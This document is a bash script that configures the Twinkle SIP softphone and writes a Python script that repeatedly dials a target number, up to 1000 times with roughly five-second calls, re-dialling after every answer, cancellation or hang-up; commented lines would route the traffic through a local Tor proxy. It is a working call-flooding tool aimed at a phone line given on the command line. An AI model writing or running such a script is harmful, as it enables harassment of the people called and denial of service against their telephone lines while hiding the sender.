#!/bin/bash
cd ~
mkdir .twinkle
cd .twinkle

cat <<EOF > twinkle.cfg
# USER
user_name=${SIP_USER}
user_domain=${SIP_SERVER}
user_display=${SIP_USER}
user_organization=
auth_realm=
auth_name=${SIP_USER}
auth_pass=${SIP_PASS}
auth_aka_op=00000000000000000000000000000000
auth_aka_amf=0000

# SIP SERVER
outbound_proxy=
all_requests_to_proxy=no
registrar=${SIP_SERVER}
register_at_startup=yes
registration_time=3600
reg_add_qvalue=no
reg_qvalue=1

# RTP AUDIO
codecs=speex-wb,speex-nb,g711a,g711u,gsm
ptime=20
out_far_end_codec_pref=yes
in_far_end_codec_pref=yes
speex_nb_payload_type=97
speex_wb_payload_type=98
speex_uwb_payload_type=99
speex_bit_rate_type=cbr
speex_dtx=no
speex_penh=yes
speex_quality=6
speex_complexity=3
speex_dsp_vad=yes
speex_dsp_agc=yes
speex_dsp_aec=no
speex_dsp_nrd=yes
speex_dsp_agc_level=20
ilbc_payload_type=96
ilbc_mode=30
g726_16_payload_type=102
g726_24_payload_type=103
g726_32_payload_type=104
g726_40_payload_type=105
g726_packing=rfc3551
dtmf_transport=auto
dtmf_payload_type=101
dtmf_duration=100
dtmf_pause=40
dtmf_volume=10

# SIP PROTOCOL
hold_variant=rfc3264
check_max_forwards=no
allow_missing_contact_reg=yes
registration_time_in_contact=yes
compact_headers=no
encode_multi_values_as_list=yes
use_domain_in_contact=no
allow_sdp_change=no
allow_redirection=yes
ask_user_to_redirect=yes
max_redirections=5
ext_100rel=supported
ext_replaces=yes
referee_hold=no
referrer_hold=yes
allow_refer=yes
ask_user_to_refer=yes
auto_refresh_refer_sub=no
attended_refer_to_aor=no
allow_xfer_consult_inprog=no
send_p_preferred_id=no

# Transport/NAT
sip_transport=auto
sip_transport_udp_threshold=1300
nat_public_ip=
stun_server=
persistent_tcp=yes
enable_nat_keepalive=no

# TIMERS
timer_noanswer=30
timer_nat_keepalive=30
timer_tcp_ping=30

# ADDRESS FORMAT
display_useronly_phone=yes
numerical_user_is_phone=no
remove_special_phone_symbols=yes
special_phone_symbols=-()/.
use_tel_uri_for_phone=no

# RING TONES
ringtone_file=
ringback_file=

# SCRIPTS
script_incoming_call=
script_in_call_answered=
script_in_call_failed=
script_outgoing_call=
script_out_call_answered=
script_out_call_failed=
script_local_release=
script_remote_release=

# NUMBER CONVERSION

# SECURITY
zrtp_enabled=no
zrtp_goclear_warning=yes
zrtp_sdp=yes
zrtp_send_if_supported=no

# MWI
mwi_sollicited=no
mwi_user=
mwi_server=
mwi_via_proxy=no
mwi_subscription_time=3600
mwi_vm_address=

# INSTANT MESSAGE
im_max_sessions=10
im_send_iscomposing=yes

# PRESENCE
pres_subscription_time=3600
pres_publication_time=3600
pres_publish_startup=yes

EOF


cat <<EOF > sip.py
#!/usr/bin/env python3
import time
import sys
import socket
import socks
from pytwinkle import Twinkle

#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
#socket.socket = socks.socksocket

target=sys.argv[1]

def loopcall():
    for x in range(0, 1000):
        mTP.call("sip:"+target+"@${SIP_SERVER}")
        time.sleep(5.1)
        mTP.bye()

def callback(event, *args):
    print(event)
    if event=="registration_succeeded":
        uri, expires = args
        print("registratiom succeeded, uri: %s, expires in %s seconds"%(uri, expires))
        loopcall()

    if event=="cancelled_call":
        line=args[0]
        print("call cancelled, line: %s"%(line))
        loopcall()

    if event=="answered_call":
        call=args[0]
        print("answered: %s"%(str(call)))
        mTP.bye()
        loopcall()

    if event=="ended_call":
        line=args[0]
        print("call ended, line: %s"%(line))
        loopcall()

mTP = Twinkle(callback)
mTP.run()

EOF


chmod 755 sip.py

sudo ./sip.py ${TARGET}
